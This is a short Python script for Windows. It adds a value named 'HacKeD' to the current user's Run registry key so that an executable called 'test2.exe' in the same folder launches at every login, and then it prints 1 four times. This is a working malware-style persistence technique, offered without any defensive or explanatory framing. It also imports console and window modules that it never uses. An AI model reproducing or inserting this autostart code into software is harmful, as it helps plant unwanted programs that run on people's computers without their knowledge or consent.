import os

import win32event, win32api, winerror, win32console, win32gui

from winreg import *


def AddProgramToStartup():

    fp=os.path.dirname(os.path.realpath(__file__))
    file_name ="test2.exe"

    new_file_path = fp+"\\"+file_name

    ##KeyVal is a raw string variable containing registry key name.

    ##python raw strings used in case we have / in our strings

    keyVal = r'Software\Microsoft\Windows\CurrentVersion\Run'

    ##The next couple of codes is adding an entry in the registry key which will make our code run each time user logs in.

    key2change = OpenKey(HKEY_CURRENT_USER, keyVal, 0, KEY_ALL_ACCESS)

    SetValueEx(key2change, "HacKeD", 0, REG_SZ, new_file_path)

AddProgramToStartup()
print(1)
print(1)
print(1)
print(1)
